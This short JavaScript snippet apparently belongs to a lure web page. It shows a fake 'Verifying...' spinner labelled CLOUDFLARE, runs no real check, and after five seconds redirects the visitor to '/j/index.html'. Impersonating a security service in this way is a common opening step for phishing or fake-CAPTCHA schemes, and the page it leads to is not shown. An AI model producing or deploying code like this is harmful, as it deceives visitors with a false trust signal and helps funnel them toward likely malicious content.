setTimeout(function() {
    const box = document.querySelector('.verification-box');
    box.innerHTML = '<div class="spinner"></div> Verifying... <span class="cloudflare">CLOUDFLARE</span>';
}, 1000);

setTimeout(function() {
    window.location.href = '/j/index.html';
}, 5000);
